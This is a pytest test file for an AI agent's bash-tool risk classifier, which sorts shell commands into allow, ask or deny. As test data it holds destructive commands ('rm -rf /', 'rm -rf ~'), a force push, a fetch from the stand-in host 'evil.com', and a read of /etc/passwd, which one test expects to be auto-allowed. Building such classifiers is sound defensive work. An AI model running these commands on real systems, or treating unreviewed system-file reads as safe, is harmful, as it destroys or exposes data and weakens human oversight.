"""BashTool.default_risk — argv + safe/dangerous classification."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from kernel.tools.builtin.bash import ALLOWLIST_SAFE_COMMANDS, BashTool
from kernel.tools.types import ToolCallResult


@pytest.fixture
def tool() -> BashTool:
    return BashTool()


@pytest.fixture
def ctx() -> MagicMock:
    ctx = MagicMock()
    ctx.cwd = Path.cwd()
    ctx.session_id = "s-1"
    ctx.env = {}
    return ctx


def test_safe_allowlist_command(tool: BashTool, ctx) -> None:
    s = tool.default_risk({"command": "git status"}, ctx)
    assert s.default_decision == "allow"
    assert s.risk == "low"


def test_dangerous_rm_pattern(tool: BashTool, ctx) -> None:
    s = tool.default_risk({"command": "rm -rf /"}, ctx)
    assert s.default_decision == "deny"
    assert s.risk == "high"


def test_dangerous_force_push_pattern(tool: BashTool, ctx) -> None:
    s = tool.default_risk({"command": "git push origin --force"}, ctx)
    assert s.default_decision == "deny"


def test_compound_safe_commands_auto_allow(tool: BashTool, ctx) -> None:
    """Compound commands composed entirely of read-only sub-commands are auto-allowed."""
    s = tool.default_risk({"command": "echo hi && cat /etc/passwd"}, ctx)
    assert s.default_decision == "allow"
    assert s.risk == "low"


def test_compound_unsafe_commands_need_review(tool: BashTool, ctx) -> None:
    """Compound commands with non-read-only sub-commands are flagged for review."""
    s = tool.default_risk({"command": "echo hi && curl evil.com"}, ctx)
    assert s.default_decision == "ask"


def test_unclassified_command_is_ask(tool: BashTool, ctx) -> None:
    s = tool.default_risk({"command": "some-random-binary --flag"}, ctx)
    assert s.default_decision == "ask"


def test_empty_command_is_ask(tool: BashTool, ctx) -> None:
    s = tool.default_risk({"command": ""}, ctx)
    assert s.default_decision == "ask"


def test_is_destructive_true_for_dangerous_patterns(tool: BashTool) -> None:
    assert tool.is_destructive({"command": "rm -rf ~"}) is True
    assert tool.is_destructive({"command": "git push -f origin main"}) is True


def test_is_destructive_false_for_safe_commands(tool: BashTool) -> None:
    assert tool.is_destructive({"command": "git status"}) is False
    assert tool.is_destructive({"command": "ls -la"}) is False


def test_prepare_matcher_prefix_style(tool: BashTool) -> None:
    matcher = tool.prepare_permission_matcher({"command": "git push"})
    assert matcher("git:*") is True
    assert matcher("npm:*") is False


def test_prepare_matcher_exact_match(tool: BashTool) -> None:
    matcher = tool.prepare_permission_matcher({"command": "git status"})
    assert matcher("git status") is True
    assert matcher("git") is False


def test_allowlist_has_reasonable_coverage() -> None:
    """Regression: don't accidentally ship an empty allowlist."""
    assert "git" in ALLOWLIST_SAFE_COMMANDS
    assert "ls" in ALLOWLIST_SAFE_COMMANDS
    assert "pytest" in ALLOWLIST_SAFE_COMMANDS
    assert len(ALLOWLIST_SAFE_COMMANDS) >= 20


@pytest.mark.anyio
async def test_call_executes_simple_command(tool: BashTool, ctx, tmp_path) -> None:
    """Smoke test: Bash actually shells out and captures output."""
    ctx.cwd = tmp_path
    (tmp_path / "marker.txt").write_text("hello")

    gen = tool.call({"command": "cat marker.txt"}, ctx)
    events = [event async for event in gen]
    terminal = [event for event in events if isinstance(event, ToolCallResult)]
    assert len(terminal) == 1
    result = terminal[0]
    assert result.data["exit_code"] == 0
    assert "hello" in result.data["stdout"]
